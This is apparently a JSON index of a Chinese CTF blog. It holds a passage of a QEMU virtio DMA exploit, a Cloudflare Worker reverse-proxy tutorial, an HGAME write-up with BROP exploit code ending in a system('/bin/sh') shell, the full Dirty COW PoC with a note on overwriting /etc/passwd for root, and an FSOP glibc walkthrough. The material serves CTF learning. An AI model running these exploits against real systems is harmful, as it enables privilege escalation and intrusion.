cap.offset);                break;            case VIRTIO_PCI_CAP_ISR_CFG:                virtio_isr_mmio = virtio_mmio + cap.offset;                break;            case VIRTIO_PCI_CAP_DEVICE_CFG:                virtio_device_mmio = virtio_mmio + cap.offset;                break;            default:                break;        }        cap_ptr = cap.cap_next;    }    close(fd);    free(config);    struct virtio_pci_common_cfg* common_cfg = (struct virtio_pci_common_cfg*)virtio_common_mmio;    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 0);    printf(\"device_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 1);    printf(\"device_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);    printf(\"driver_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 1);    printf(\"driver_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));    struct virtio_blk_config* blk_cfg = (struct virtio_blk_config*)virtio_device_mmio;    printf(\"capacity: %lx\\n\", mmio_read64(&amp;blk_cfg-&gt;capacity));    printf(\"size_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;size_max));    printf(\"seg_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;seg_max));    printf(\"geometry.cylinders: %x\\n\", mmio_read16(&amp;blk_cfg-&gt;geometry.cylinders));    printf(\"geometry.heads: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.heads));    printf(\"geometry.sectors: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.sectors));    printf(\"blk_size: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;blk_size));    // reset device    mmio_write8(&amp;common_cfg-&gt;device_status, 0);    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_ACKNOWLEDGE);    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);    mmio_write32(&amp;common_cfg-&gt;driver_feature, 0); // disable all features    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);    assert(mmio_read8(&amp;common_cfg-&gt;device_status) &amp; VIRTIO_CONFIG_S_FEATURES_OK);    // alloc dma memory    int dma_fd = open(\"/dev/mem\", O_RDWR | O_SYNC);    if(dma_fd &lt; 0){        ERR(\"Open dma\");    }    dma_mem = mmap((void*)0x3ffdd000, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0x3ffdd000);    if(dma_mem == (volatile void*)-1){        ERR(\"mmap dma mem\");    }    *(volatile uint32_t*)dma_mem = 0x12345678;    printf(\"%x\\n\", *(volatile uint32_t*)dma_mem);    *(volatile uint32_t*)dma_mem = 0;    printf(\"dma_mem: %p\\n\", dma_mem);    dma_data = dma_mem + 0x1000;    queue_desc = (struct virtq_desc*)dma_mem;    queue_avail = (struct virtq_avail*)((char*)queue_desc + 0x10 * VIRTIO_QUEUE_SIZE);    queue_used = (struct virtq_used*)((char*)dma_mem + 0x200);    // init queue    mmio_write16(&amp;common_cfg-&gt;queue_select, 0);    mmio_write16(&amp;common_cfg-&gt;queue_size, VIRTIO_QUEUE_SIZE);    mmio_write64(&amp;common_cfg-&gt;queue_desc, (size_t)0x3ffdd000);    mmio_write64(&amp;common_cfg-&gt;queue_driver, (size_t)0x3ffdd100);    mmio_write64(&amp;common_cfg-&gt;queue_device, (size_t)0x3ffdd200);    mmio_write16(&amp;common_cfg-&gt;queue_enable, 1);    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER_OK | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);    puts(\"virtio init done\");}void spray(){    for(int i = 0xfff; i &gt; 0x28; i-=4){        mmio_write32((void*)readflag_mmio, i);    }}void hexdump(void* addr, size_t size){    // dump 4 bytes per time    for(int i = 0; i &lt; size; i+=4){        uint32_t val = *(volatile uint32_t*)(addr+i);        for(int j = 0; j &lt; 4; j++){            uint8_t chr = (val &gt;&gt; (j*8)) &amp; 0xff;            if(chr &gt;= 0x20 &amp;&amp; chr &lt;= 0x7e){                putchar(chr);            }else{                putchar('?');            }        }    }}int main(){    setbuf(stdout, NULL);    init_readflag();    init_virtio();    volatile struct virtio_blk_req* req = (struct virtio_blk_req*)dma_data;    req-&gt;type = 0xffffffffu;    req-&gt;sector = 0;    req-&gt;reserved = 0;    queue_desc[0].addr = (size_t)req;    queue_desc[0].len = 0x10;    queue_desc[0].flags = VIRTQ_DESC_F_NEXT;    queue_desc[0].next = 1;    queue_desc[1].addr = (size_t)0xfe000000;    queue_desc[1].len = 0xfff;    queue_desc[1].flags = VIRTQ_DESC_F_WRITE | VIRTQ_DESC_F_NEXT;    queue_desc[1].next = 2;    queue_desc[2].addr = (size_t)dma_data + 0xa00;    queue_desc[2].len = 1;    queue_desc[2].flags = VIRTQ_DESC_F_WRITE;    queue_desc[2].next = 0;    queue_avail-&gt;flags = 1;    queue_avail-&gt;ring[0] = 0;    queue_avail-&gt;idx = 1;    mb();    mmio_write8((void*)virtio_isr_mmio, 1);    struct virtio_pci_common_cfg* common_cfg = (struct virtio_pci_common_cfg*)virtio_common_mmio;    void* notify_addr = (void*)((uintptr_t)virtio_notify_mmio + mmio_read32((void*)&amp;virtio_notify_mmio-&gt;cap.offset) + mmio_read16(&amp;common_cfg-&gt;queue_notify_off) * mmio_read32((void*)&amp;virtio_notify_mmio-&gt;notify_off_multiplier));    puts(\"--------------------------------\");    for(int i = 0; i &lt; 0x100; i+=4){        spray();    }    mmio_write16(notify_addr, 0);    puts(\"--------------------------------\");    hexdump((char*)virtio_common_mmio + 0x000, 0x100);    munmap(dma_mem, 0x3000);    munmap(virtio_mmio, 0x4000);    munmap(readflag_mmio, 0x1000);}\nReferences\n\n\n\nVirtual\nI/O Device (VIRTIO) Version 1.1↩︎\nVirtqueues\nand virtio ring: How the data travels↩︎\nMemory-mapped\nI/O and port-mapped I/O↩︎\n\n\n","categories":["CTF"],"tags":["pwn","qemu","virtio","dma"]},{"title":"Cloudflare Worker 反向代理尝试","url":"/categories/Web/cloudflare-worker-proxy/","content":"前言\n由于友链页面有使用图片的要求，同时为其他人的站点提供相关的图片资源（虽然使用现成的 GitHub\nPage 就可以基本实现，但是 Page 所在的仓库是公开的），尝试通过 GitHub 作为图床解决这个问题。然而，访问速度和稳定性都无法得到保证，为此通过网上搜索学习了一下反向代理\n(Reverse Proxy) 的相关知识。\n\n什么事反向代理\n在这之前，先来看看什么是正向代理 1 (Forward Proxy)：\n客户端通过代理服务器去请求服务器的资源。\n\n\nTwo computers connected via a proxy\nserver. The first computer says to the proxy server: \"ask the second\ncomputer what the time is\".\n\n使用正向代理需要客户端进行一些设置，即配置代理服务器。\n而反向代理 2 是指代理服务器向服务器转交请求，并返回内容给客户端，客户端将其认为是原始服务器。\n\n\nA proxy server connecting the Internet to\nan internal network.\n\n搭建反向代理服务\n创建图床仓库\n在 GitHub 中创建一个仓库，可以选择是否是私密的。\n\n在 Personal Access\nTokens (Classic) 处创建一个新的 token，勾选 repo\n下所有权限。\n\n过期时间我偷懒选了永不过期，不过这样肯定会导致安全性降低的。生成 token 后放在安全的地方，刷新后就看不见了。\n配置 Worker\nCloudflare\nWorkers\n提供了这样的服务，但是免费使用具有一定的请求限制。在仪表板中添加一个\nWorker，这里命名为 assets。使用的代码如下：\nconst upstream = \"raw.githubusercontent.com\";// Custom pathname for the upstream website.// (1) 填写代理的路径，格式为 /&lt;用户&gt;/&lt;仓库名&gt;/&lt;分支&gt;const upstream_path = \"/avasummer/assets/main\";// github personal access token.// (2) 填写github令牌const github_token = \"your_tokenhere\";// Website you intended to retrieve for users using mobile devices.const upstream_mobile = upstream;// Countries and regions where you wish to suspend your service.const blocked_region = [];// IP addresses which you wish to block from using your service.const blocked_ip_address = [\"0.0.0.0\", \"127.0.0.1\"];// Whether to use HTTPS protocol for upstream address.const https = true;// Whether to disable cache.const disable_cache = false;// Replace texts.const replace_dict = {  $upstream: \"$custom_domain\",};addEventListener(\"fetch\", (event) =&gt; {  event.respondWith(fetchAndApply(event.request));});async function fetchAndApply(request) {  const region = request.headers.get(\"cf-ipcountry\")?.toUpperCase();  const ip_address = request.headers.get(\"cf-connecting-ip\");  const user_agent = request.headers.get(\"user-agent\");  let response = null;  let url = new URL(request.url);  let url_hostname = url.hostname;  if (https == true) {    url.protocol = \"https:\";  } else {    url.protocol = \"http:\";  }  if (await device_status(user_agent)) {    var upstream_domain = upstream;  } else {    var upstream_domain = upstream_mobile;  }  url.host = upstream_domain;  if (url.pathname == \"/\") {    url.pathname = upstream_path;  } else {    url.pathname = upstream_path + url.pathname;  }  if (blocked_region.includes(region)) {    response = new Response(      \"Access denied: WorkersProxy is not available in your region yet.\",      {        status: 403,      }    );  } else if (blocked_ip_address.includes(ip_address)) {    response = new Response(      \"Access denied: Your IP address is blocked by WorkersProxy.\",      {        status: 403,      }    );  } else {    let method = request.method;    let request_headers = request.headers;    let new_request_headers = new Headers(request_headers);    new_request_headers.set(\"Host\", upstream_domain);    new_request_headers.set(\"Referer\", url.protocol + \"//\" + url_hostname);    new_request_headers.set(\"Authorization\", \"token \" + github_token);    let original_response = await fetch(url.href, {      method: method,      headers: new_request_headers,      body: request.body,    });    connection_upgrade = new_request_headers.get(\"Upgrade\");    if (connection_upgrade &amp;&amp; connection_upgrade.toLowerCase() == \"websocket\") {      return original_response;    }    let original_response_clone = original_response.clone();    let original_text = null;    let response_headers = original_response.headers;    let new_response_headers = new Headers(response_headers);    let status = original_response.status;    if (disable_cache) {      new_response_headers.set(\"Cache-Control\", \"no-store\");    } else {      new_response_headers.set(\"Cache-Control\", \"max-age=43200000\");    }    new_response_headers.set(\"access-control-allow-origin\", \"*\");    new_response_headers.set(\"access-control-allow-credentials\", true);    new_response_headers.delete(\"content-security-policy\");    new_response_headers.delete(\"content-security-policy-report-only\");    new_response_headers.delete(\"clear-site-data\");    if (new_response_headers.get(\"x-pjax-url\")) {      new_response_headers.set(        \"x-pjax-url\",        response_headers          .get(\"x-pjax-url\")          .replace(\"//\" + upstream_domain, \"//\" + url_hostname)      );    }    const content_type = new_response_headers.get(\"content-type\");    if (      content_type != null &amp;&amp;      content_type.includes(\"text/html\") &amp;&amp;      content_type.includes(\"UTF-8\")    ) {      original_text = await replace_response_text(        original_response_clone,        upstream_domain,        url_hostname      );    } else {      original_text = original_response_clone.body;    }    response = new Response(original_text, {      status,      headers: new_response_headers,    });  }  return response;}async function replace_response_text(response, upstream_domain, host_name) {  let text = await response.text();  var i, j;  for (i in replace_dict) {    j = replace_dict[i];    if (i == \"$upstream\") {      i = upstream_domain;    } else if (i == \"$custom_domain\") {      i = host_name;    }    if (j == \"$upstream\") {      j = upstream_domain;    } else if (j == \"$custom_domain\") {      j = host_name;    }    let re = new RegExp(i, \"g\");    text = text.replace(re, j);  }  return text;}async function device_status(user_agent_info) {  var agents = [    \"Android\",    \"iPhone\",    \"SymbianOS\",    \"Windows Phone\",    \"iPad\",    \"iPod\",  ];  var flag = true;  for (var v = 0; v &lt; agents.length; v++) {    if (user_agent_info.indexOf(agents[v]) &gt; 0) {      flag = false;      break;    }  }  return flag;}\n部署 Worker，然后在设置 - 域和路由中添加自定义域：\n\n现在您的图床应该可以正常访问了。\nhelloworld.jpg (300×384): https://assets.summ2.link/helloworld.jpg\n小彩蛋\n众所周知，似乎在 2020 年前后，Pixiv\n就无法被直接访问了。下面借此机会，尝试搭建一个 Pixiv\n图床的反向代理服务。由于 i.pximg.net\n的盗链保护，得把之前的代码做一些修改。\n// Website you intended to retrieve for users.const upstream = \"i.pximg.net\";// Website you intended to retrieve for users using mobile devices.const upstream_mobile = upstream;// Countries and regions where you wish to suspend your service.const blocked_region = [];// IP addresses which you wish to block from using your service.const blocked_ip_address = [\"0.0.0.0\", \"127.0.0.1\"];// Whether to use HTTPS protocol for upstream address.const https = true;// Whether to disable cache.const disable_cache = false;// Replace texts.const replace_dict = {  $upstream: \"$custom_domain\",};addEventListener(\"fetch\", (event) =&gt; {  event.respondWith(fetchAndApply(event.request));});async function fetchAndApply(request) {  const region = request.headers.get(\"cf-ipcountry\")?.toUpperCase();  const ip_address = request.headers.get(\"cf-connecting-ip\");  const user_agent = request.headers.get(\"user-agent\");  let response = null;  let url = new URL(request.url);  let url_hostname = url.hostname;  if (https == true) {    url.protocol = \"https:\";  } else {    url.protocol = \"http:\";  }  if (await device_status(user_agent)) {    var upstream_domain = upstream;  } else {    var upstream_domain = upstream_mobile;  }  url.host = upstream_domain;/*  if (url.pathname == \"/\") {    url.pathname = upstream_path;  } else {    url.pathname = upstream_path + url.pathname;  }*/  if (blocked_region.includes(region)) {    response = new Response(      \"Access denied: WorkersProxy is not available in your region yet.\",      {        status: 403,      }    );  } else if (blocked_ip_address.includes(ip_address)) {    response = new Response(      \"Access denied: Your IP address is blocked by WorkersProxy.\",      {        status: 403,      }    );  } else {    let method = request.method;    let request_headers = request.headers;    let new_request_headers = new Headers(request_headers);    new_request_headers.set('Referer', 'https://www.pixiv.net/');    let original_response = await fetch(url.href, {      method: method,      headers: new_request_headers,      body: request.body,    });    connection_upgrade = new_request_headers.get(\"Upgrade\");    if (connection_upgrade &amp;&amp; connection_upgrade.toLowerCase() == \"websocket\") {      return original_response;    }    let original_response_clone = original_response.clone();    let original_text = null;    let response_headers = original_response.headers;    let new_response_headers = new Headers(response_headers);    let status = original_response.status;    if (disable_cache) {      new_response_headers.set(\"Cache-Control\", \"no-store\");    } else {      new_response_headers.set(\"Cache-Control\", \"max-age=43200000\");    }    new_response_headers.set(\"access-control-allow-origin\", \"*\");    new_response_headers.set(\"access-control-allow-credentials\", true);    new_response_headers.delete(\"content-security-policy\");    new_response_headers.delete(\"content-security-policy-report-only\");    new_response_headers.delete(\"clear-site-data\");    if (new_response_headers.get(\"x-pjax-url\")) {      new_response_headers.set(        \"x-pjax-url\",        response_headers          .get(\"x-pjax-url\")          .replace(\"//\" + upstream_domain, \"//\" + url_hostname)      );    }    const content_type = new_response_headers.get(\"content-type\");    if (      content_type != null &amp;&amp;      content_type.includes(\"text/html\") &amp;&amp;      content_type.includes(\"UTF-8\")    ) {      original_text = await replace_response_text(        original_response_clone,        upstream_domain,        url_hostname      );    } else {      original_text = original_response_clone.body;    }    response = new Response(original_text, {      status,      headers: new_response_headers,    });  }  return response;}async function replace_response_text(response, upstream_domain, host_name) {  let text = await response.text();  var i, j;  for (i in replace_dict) {    j = replace_dict[i];    if (i == \"$upstream\") {      i = upstream_domain;    } else if (i == \"$custom_domain\") {      i = host_name;    }    if (j == \"$upstream\") {      j = upstream_domain;    } else if (j == \"$custom_domain\") {      j = host_name;    }    let re = new RegExp(i, \"g\");    text = text.replace(re, j);  }  return text;}async function device_status(user_agent_info) {  var agents = [    \"Android\",    \"iPhone\",    \"SymbianOS\",    \"Windows Phone\",    \"iPad\",    \"iPod\",  ];  var flag = true;  for (var v = 0; v &lt; agents.length; v++) {    if (user_agent_info.indexOf(agents[v]) &gt; 0) {      flag = false;      break;    }  }  return flag;}\n事实上实现基本的反代功能，只需要如下代码：\nexport default {  async fetch(request) {    const url = new URL(request.url);    url.hostname = 'i.pximg.net';    const proxyRequest = new Request(url, request);    proxyRequest.headers.set('Referer', 'https://www.pixiv.net/');    return fetch(proxyRequest);  },};\n部署在 pixiv.summ2.link 上，它可以成功配置在 PixEz（一个 Pixiv\n第三方客户端）中。\nExample:\nhttps://pixiv.summ2.link/img-original/img/2023/11/20/18/53/42/113565191_p0.jpg\n参考\n\n\n\nhttps://en.wikipedia.org/wiki/Proxy_server↩︎\nhttps://en.wikipedia.org/wiki/Reverse_proxy↩︎\n\n\n","categories":["Web"],"tags":["Reverse Proxy"]},{"title":"HGAME 2025 Final 复现","url":"/categories/CTF/hgame-2025-final/","content":"Backto2016\n\n但你必须先向我们证明自己有回到 2016 的实力！\n祝你玩的开心 o (￣▽￣) ブ\n没有附件是正常的喵\n这个分数或许也考虑了买 hint 这件事，别害怕嘻嘻\n\n这道题是没有给出附件的，我们需要根据输入和程序的输出获取一切信息。\n\n\nVulnerabilities\n随便输入一些字符会发现，程序存在栈溢出漏洞，出题人很友好地提供了程序崩溃的更多信息（***\nstack smashing detected ***: terminated）\n存在 Canary 保护。\n\n注意到在交互进程结束后，会保持连接，返回一个 PID+1 的新进程，这提示我们程序使用 fork() 实现功能。\n\n\n赛后放出的源码\n\n因此，子进程的 Canary 值不会改变。\nExploit\n从题目的提示可以知道，其实这是类似于 HCTF2016 brop1 的一道题目。\n运用的攻击方法叫做 Blind Return Oriented Programming (BROP)2。\nBROP 的主要流程：\n\n绕过 Canary 和 PIE 的保护；\n寻找 \"stop gadget\";\n 寻找控制寄存器的 gadget;\ndump memory to get the binary\n 获得 libc base，然后 get shell\n\nCanary bypass\nBROP 首先需要我们绕过 Canary：\n\n\nStack reading. A single byte on the stack\nis overwritten with guess X. If the service crashes, the wrong value was\nguessed.\n\nStop gadget\nStop gadget 指的是可以将程序挂起的一段 gadget。\n为什么需要 Stop gadget? 如果我们将 Return\naddress 覆盖成随机的数据，那么很大概率会引发段错误。而 Stop\ngadget 能让程序保持正常运行，在寻找其他 gadget 时起到了区分作用。\n\n\nstop gadget is useful!\n\n当我们成功找到了一个 gadget，$rsp 进入寄存器，程序进入 $rsp+8&lt;stop_gadget&gt;。\n如果还未找到这个 gadget，程序会直接发生段错误。这个作用在下一节会更具体地体现。\nCommon gadget\n在 Ubuntu\n14.04 中，我们有一个很好的函数__libc_csu_init()，里面存在控制传参寄存器的 gadget，具体请参考通用\ngadget。\n0x000000000040082a &lt;+90&gt;:    5b      pop    rbx0x000000000040082b &lt;+91&gt;:    5d      pop    rbp0x000000000040082c &lt;+92&gt;:    41 5c   pop    r120x000000000040082e &lt;+94&gt;:    41 5d   pop    r130x0000000000400830 &lt;+96&gt;:    41 5e   pop    r140x0000000000400832 &lt;+98&gt;:    41 5f   pop    r150x0000000000400834 &lt;+100&gt;:   c3      ret\n所以，我们可以这样布置栈数据：\npayload = flat({    offset: [        canary,        p64(1),        p64(pop_gadget),        p64(0)*6,        p64(stop_gadget)        ]    })\n但是还存在一个小问题，如果遍历时 pop_gadget 恰好是另一个 stop\ngadget，程序也不会发生段错误，和执行到真正的 gadget 处结果一样。\n因此，我们还需要进一步验证，它是否我们需要的。\n在这道题中，我找到的 stop gadget 会输出一些固定字符：\nif ( b\"killed by\" not in resp):    payload = flat({            offset: [                canary,                p64(1),                p64(pop_gadget)                ]            })            p.sendafter(\"password\",payload)            resp = p.recv()            resp = p.recv()            log.success(f\"stop_gadget[{i}] = {hex(stop_gadget)}\")            log.success(f\"pop_gadget[{i}] = {hex(pop_gadget)}\")            choose = input(\"Continue?\")            if(choose==\"y\" or choose==\"Y\"):continue            break\n观察回显，如果没有输出，那么这大概率是正确的。当然在后续过程中我们可以更确定这个 gadget 是不是真的。\nDump memory\n得到需要的 gadget，就可以开始 dump memory 了。\n为了找到 write() 的 plt 地址，可以将 $rdi 赋值 0x400000，即 write(0x400000)，如果地址正确，我们会得到 ELF 头几个固定字符：\\x7fELF\nwhile True:    put_addr += 1    payload = flat({    offset: [        canary,        p64(1),        p64(pop_gadget),        p64(0x400000),#pop rdi        p64(put_addr),        p64(stop_gadget)        ]    })    p.sendafter(\"password\",payload)    try:         resp = p.recv()        resp = p.recv()        if ( b\"\\x7fELF\" in resp):            log.success(f\"put found[{i}] = {hex(put_addr)}\")            choose = input(\"Continue?\")            if(choose==\"y\" or choose==\"Y\"):continue            break    except:        pass\n\n回顾 plt 表的知识，我们知道，已经调用过的函数地址会被保存在.got 段中。\nGet shell\n后续过程就比较简单了，写 ROP 链即可。\nstop_gadget=0x400700pop_gadget=0x400b2a+0x9put_addr = 0x400715got_addr = 0x602018payload = flat({      offset: [        canary,        p64(1),        p64(pop_gadget),        p64(got_addr),#pop rdi        p64(put_addr),    ]})p.sendafter(\"password:\\n\",payload)put_addr = u64(p.recv(6).ljust(8, b'\\x00'))log.success(hex(put_addr))libc_base = put_addr - libc.sym[\"puts\"]log.success(hex(libc_base))sys_addr = libc_base + libc.sym[\"system\"]binsh_addr = libc_base +next(libc.search(b\"/bin/sh\"))pause()payload = flat({      offset: [        canary,        p64(1),        p64(pop_gadget),        p64(binsh_addr),#pop rdi        p64(sys_addr),    ]})p.sendafter(\"password:\",payload)p.interactive()\nBackto2016(2)\n这题赛时并没有做出来（而且靶机跑的很慢，爆破不动），后面看了 wp 了解到这是一个 kernel\nvulnerability。\nCopy On Write3\n\nCopy-on-write (COW), also called\nimplicit sharingor shadowing,is a resource-management\ntechnique used in programming\nto manage shared data efficiently. Instead of copying data right away\nwhen multiple programs use it, the same data is shared between programs\nuntil one tries to modify it. If no changes are made, no private copy is\ncreated, saving resources.\nA copy is only made when needed, ensuring each program has its own\nversion when modifications occur. This technique is commonly applied to\nmemory, files, and data structures.\n\n例如 fork() 创建子进程时，为了节省内存空间和时间开销，使用了写时复制的策略。\n\n\nTake a lot space and time\n\n\n\nCopy-on-write\n\nDirty-cow4\n通过 mmap() 映射文件到内存，利用写时复制，\nwrite 和 madvise() 导致的条件竞争漏洞。\n下面是它的一个 POC，可参见：https://github.com/dirtycow/dirtycow.github.io\n/*####################### dirtyc0w.c #######################$ sudo -s# echo this is not a test &gt; foo# chmod 0404 foo$ ls -lah foo-r-----r-- 1 root root 19 Oct 20 15:23 foo$ cat foothis is not a test$ gcc -pthread dirtyc0w.c -o dirtyc0w$ ./dirtyc0w foo m00000000000000000mmap 56123000madvise 0procselfmem 1800000000$ cat foom00000000000000000####################### dirtyc0w.c #######################*/#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;void *map;int f;struct stat st;char *name; void *madviseThread(void *arg){  char *str;  str=(char*)arg;  int i,c=0;  for(i=0;i&lt;100000000;i++)  {/*You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call&gt; while having the page of the executable mmapped in memory.*/    c+=madvise(map,100,MADV_DONTNEED);  }  printf(\"madvise %d\\n\\n\",c);} void *procselfmemThread(void *arg){  char *str;  str=(char*)arg;/*You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16&gt;  The in the wild exploit we are aware of doesn't work on Red Hat&gt;  Enterprise Linux 5 and 6 out of the box because on one side of&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not&gt;  writable on Red Hat Enterprise Linux 5 and 6.*/  int f=open(\"/proc/self/mem\",O_RDWR);  int i,c=0;  for(i=0;i&lt;100000000;i++) {/*You have to reset the file pointer to the memory position.*/    lseek(f,(uintptr_t) map,SEEK_SET);    c+=write(f,str,strlen(str));  }  printf(\"procselfmem %d\\n\\n\", c);}  int main(int argc,char *argv[]){/*You have to pass two arguments. File and Contents.*/  if (argc&lt;3) {  (void)fprintf(stderr, \"%s\\n\",      \"usage: dirtyc0w target_file new_content\");  return 1; }  pthread_t pth1,pth2;/*You have to open the file in read only mode.*/  f=open(argv[1],O_RDONLY);  fstat(f,&amp;st);  name=argv[1];/*You have to use MAP_PRIVATE for copy-on-write mapping.&gt; Create a private copy-on-write mapping.  Updates to the&gt; mapping are not visible to other processes mapping the same&gt; file, and are not carried through to the underlying file.  It&gt; is unspecified whether changes made to the file after the&gt; mmap() call are visible in the mapped region.*//*You have to open with PROT_READ.*/  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);  printf(\"mmap %zx\\n\\n\",(uintptr_t) map);/*You have to do it on two threads.*/  pthread_create(&amp;pth1,NULL,madviseThread,argv[1]);  pthread_create(&amp;pth2,NULL,procselfmemThread,argv[2]);/*You have to wait for the threads to finish.*/  pthread_join(pth1,NULL);  pthread_join(pth2,NULL);  return 0;}\n以 ~/foo 为例，这是一个只读文件：\n\n\n运行 dirtycow：\n\n结果如下：\n\n同理，如果我们修改 /etc/passwd，就可以实现提权。\nReferences\n\n\n\npwn_hctf2016_brop.md↩︎\nbittau-brop.pdf↩︎\nCopy-on-write↩︎\nDirty\nCOW↩︎\n\n\n","categories":["CTF"],"tags":["pwn","hgame","kernel","blind pwn"]},{"title":"Vidar 分享会 - FSOP","url":"/categories/CTF/vidarshare-fsop/","content":"I. FSOP\n\nFSOP 是 File Stream Oriented Programming 的缩写。\nFSOP 的核心思想就是劫持\n_IO_list_all 的值来伪造链表和其中的\n_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP\n选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个\nFILE 调用\nfflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。\n\n\nII. RTFSC\n下面我将以 glibc-2.39 源码为例，分析 FSOP 的一个实际应用 ---House of\nApple (2)1 涉及的原理。\n_IO_FILE\n/libio/bits/types/struct_FILE.h 中有如下定义：\nstruct _IO_FILE{  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */  /* The following pointers correspond to the C++ streambuf protocol. */  char *_IO_read_ptr;\t/* Current read pointer */  char *_IO_read_end;\t/* End of get area. */  char *_IO_read_base;\t/* Start of putback+get area. */  char *_IO_write_base;\t/* Start of put area. */  char *_IO_write_ptr;\t/* Current put pointer. */  char *_IO_write_end;\t/* End of put area. */  char *_IO_buf_base;\t/* Start of reserve area. */  char *_IO_buf_end;\t/* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;  int _flags2;  __off_t _old_offset; /* This used to be _offset but it's too small.  */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE};struct _IO_FILE_complete{  struct _IO_FILE _file;#endif  __off64_t _offset;  /* Wide character stream stuff.  */  struct _IO_codecvt *_codecvt;  struct _IO_wide_data *_wide_data;  struct _IO_FILE *_freeres_list;  void *_freeres_buf;  size_t __pad5;  int _mode;  /* Make sure we don't get into trouble again.  */  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];};\n使用 gdb，可以得到其成员的相对偏移：\n\n\nimg\n\nExit () 调用过程\n__run_exit_handlers()\nexit() 在 /stdlib/exit.c 有定义:\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;pointer_guard.h&gt;#include &lt;libc-lock.h&gt;#include &lt;set-freeres.h&gt;#include \"exit.h\"/* Initialize the flag that indicates exit function processing   is complete. See concurrency notes in stdlib/exit.h where   __exit_funcs_lock is declared.  */bool __exit_funcs_done = false;/* Call all functions registered with `atexit' and `on_exit',   in the reverse of the order in which they were registered   perform stdio cleanup, and terminate program execution with STATUS.  */voidattribute_hidden__run_exit_handlers (int status, struct exit_function_list **listp,\t\t     bool run_list_atexit, bool run_dtors){  /* First, call the TLS destructors.  */  if (run_dtors)    call_function_static_weak (__call_tls_dtors);  __libc_lock_lock (__exit_funcs_lock);  /* We do it this way to handle recursive calls to exit () made by     the functions registered with `atexit' and `on_exit'. We call     everyone on the list and use the status value in the last     exit (). */  while (true)    {      struct exit_function_list *cur;    restart:      cur = *listp;      if (cur == NULL)\t{\t  /* Exit processing complete.  We will not allow any more\t     atexit/on_exit registrations.  */\t  __exit_funcs_done = true;\t  break;\t}      while (cur-&gt;idx &gt; 0)\t{\t  struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];\t  const uint64_t new_exitfn_called = __new_exitfn_called;\t  switch (f-&gt;flavor)\t    {\t      void (*atfct) (void);\t      void (*onfct) (int status, void *arg);\t      void (*cxafct) (void *arg, int status);\t      void *arg;\t    case ef_free:\t    case ef_us:\t      break;\t    case ef_on:\t      onfct = f-&gt;func.on.fn;\t      arg = f-&gt;func.on.arg;\t      PTR_DEMANGLE (onfct);\t      /* Unlock the list while we call a foreign function.  */\t      __libc_lock_unlock (__exit_funcs_lock);\t      onfct (status, arg);\t      __libc_lock_lock (__exit_funcs_lock);\t      break;\t    case ef_at:\t      atfct = f-&gt;func.at;\t      PTR_DEMANGLE (atfct);\t      /* Unlock the list while we call a foreign function.  */\t      __libc_lock_unlock (__exit_funcs_lock);\t      atfct ();\t      __libc_lock_lock (__exit_funcs_lock);\t      break;\t    case ef_cxa:\t      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),\t\t we must mark this function as ef_free.  */\t      f-&gt;flavor = ef_free;\t      cxafct = f-&gt;func.cxa.fn;\t      arg = f-&gt;func.cxa.arg;\t      PTR_DEMANGLE (cxafct);\t      /* Unlock the list while we call a foreign function.  */\t      __libc_lock_unlock (__exit_funcs_lock);\t      cxafct (arg, status);\t      __libc_lock_lock (__exit_funcs_lock);\t      break;\t    }\t  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))\t    /* The last exit function, or another thread, has registered\t       more exit functions.  Start the loop over.  */\t    goto restart;\t}     